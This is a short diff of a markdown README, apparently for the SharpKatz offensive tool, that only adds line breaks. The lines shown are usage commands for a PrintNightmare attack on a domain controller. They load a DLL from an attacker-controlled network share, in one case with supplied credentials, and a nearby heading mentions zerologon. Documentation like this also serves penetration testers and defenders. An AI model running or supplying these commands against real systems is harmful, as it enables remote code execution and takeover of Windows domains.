@@ -104,10 +104,10 @@ Note: Do not use zerologon in a production environment or at least plan for reco
 
 ### PrintNightmare CVE-2021-1675 - CVE-2021-34527
 
-```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll```
+```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll```<br>
 Perform PrintNightmare attack <br>
 <br>
-```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```
+```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```<br>
 Perform PrintNightmare attack with provided credentials<br>
 <br>
 
